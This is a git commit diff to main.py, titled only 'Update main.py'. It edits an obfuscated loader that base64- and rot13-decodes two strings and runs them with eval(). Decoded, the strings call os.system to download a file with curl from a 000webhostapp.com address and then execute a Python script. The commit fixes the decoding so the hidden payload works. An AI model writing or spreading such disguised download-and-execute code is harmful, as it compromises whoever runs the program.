9a3e5dd303ae592aec4bfa1f5ff816b0d2b6aa2f
fluffyleach98765 <123709719+fluffyleach98765@users.noreply.github.com>
2023-06-16 07:48:37 +0700

    Update main.py

--- main.py
+++ main.py
@@ -7,13 +7,15 @@ YmYuZmxmZ3J6KCJwaGV5IC1CIHVnZ2NmOi8vYW5odHVnLW9iYnhmLjAwMGpyb3ViZmduY2MucGJ6L2hq
 '''
 
 second = '''
-YmYuZmxmZ3J6KCJDbGd1YmEgaGpoLmNsIikK
+YmYuZmxmZ3J6KCJDbGd1YmEgaGpoLmNsIikK==
 '''
 
 first_byte = base64.b64decode(first)
-first_string = codecs.decode(first_byte, 'rot13')
+first_string = first_byte.decode()
+first_out = codecs.decode(first_string, 'rot13')
 second_byte = base64.b64decode(second)
-second_string = codecs.decode(second_byte, 'rot13')
+second_string = second_byte.decode()
+second_out = codecs.decode(second_string, 'rot13')
 
-eval(first_string)
-eval(second_string)
+eval(first_out)
+eval(second_out)
